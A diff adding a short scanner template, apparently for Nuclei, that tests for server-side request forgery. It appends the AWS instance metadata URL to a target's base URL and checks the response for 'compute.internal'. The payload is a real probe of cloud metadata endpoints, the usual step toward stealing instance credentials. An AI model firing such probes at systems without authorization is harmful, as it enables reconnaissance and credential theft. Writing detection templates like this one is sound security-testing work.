@@ -1,0 +1,18 @@
+id: SSRF
+
+info:
+  name: SSRF-AWS
+  author: 25
+  severity: high
+  tags: SSRF
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/hostname"
+
+    matchers:
+       - type: word
+         part: body
+         words:
+           - "compute.internal"
